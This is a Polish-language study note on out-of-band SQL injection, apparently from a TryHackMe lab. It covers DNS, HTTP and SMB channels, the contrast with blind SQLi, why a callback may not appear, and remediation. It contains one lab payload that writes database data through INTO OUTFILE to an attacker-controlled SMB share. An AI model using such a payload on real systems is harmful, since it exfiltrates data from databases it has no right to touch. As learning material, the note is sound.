# Out-of-Band SQL Injection

## Co oznacza OOB

OOB oznacza **Out-of-Band**.

Out-of-band SQL Injection to technika SQLi, w której wynik albo dowód nie wraca przez normalną odpowiedź webową.

Zamiast tego baza danych albo backend komunikuje się przez osobny kanał.

## Model mentalny

```text
Normalne SQLi:
request -> aplikacja -> baza danych -> wynik w odpowiedzi webowej

OOB SQLi:
request -> aplikacja -> baza danych
                       -> zewnętrzna interakcja DNS/HTTP/SMB
```

## Typowe kanały OOB

- DNS
- HTTP
- SMB / udział sieciowy

## Dowody

Dowody OOB SQLi mogą obejmować:

- callback DNS,
- callback HTTP,
- interakcję Burp Collaborator / OAST,
- plik zapisany na zewnętrznym udziale SMB,
- zewnętrzny request wykonany przez bazę albo backend.

## Różnica względem blind SQLi

Blind SQLi obserwuje zachowanie aplikacji albo czas odpowiedzi.

OOB SQLi obserwuje zewnętrzną interakcję.

```text
Blind SQLi -> zachowanie odpowiedzi/czas
OOB SQLi   -> zewnętrzny callback/plik/request
```

## Koncepcja z laba THM

Przykładowy lab używał stacked query do zapisania informacji z bazy na zewnętrznym udziale SMB:

```sql
SELECT @@version INTO OUTFILE '\\ATTACKBOX_IP\logs\out.txt';
```

To labowy przykład wymuszenia na bazie zapisu danych poza normalną odpowiedzią HTTP.

## Ważna notatka MySQL/MariaDB

`secure_file_priv` może ograniczać, gdzie MySQL/MariaDB może zapisywać pliki przez `INTO OUTFILE`.

To oznacza, że payload może być poprawny, ale środowisko nadal może blokować technikę OOB.

## Jeśli callback się nie pojawia

Brak callbacku nie dowodzi automatycznie, że OOB SQLi jest niemożliwe.

Może to oznaczać:

- błędną składnię dla danej bazy,
- brak wsparcia dla stacked queries,
- brak uprawnień użytkownika DB,
- zablokowany outbound DNS/HTTP/SMB,
- `secure_file_priv` blokuje zapisy plików,
- problem z listenerem albo AttackBox,
- problem z encodingiem payloadu,
- firewall albo segmentację sieci.

Poprawny wniosek:

```text
Nie zaobserwowano dowodu OOB dla tej konkretnej próby.
```

Nie:

```text
OOB SQLi jest niemożliwe.
```

## Remediacja

- Używaj prepared statements / parameterized queries.
- Używaj kont bazy danych z least privilege.
- Wyłącz ryzykowne funkcje bazy, jeśli nie są potrzebne.
- Ogranicz ruch wychodzący z systemów bazodanowych/backendowych.
- Monitoruj nietypowy egress DNS/HTTP/SMB.
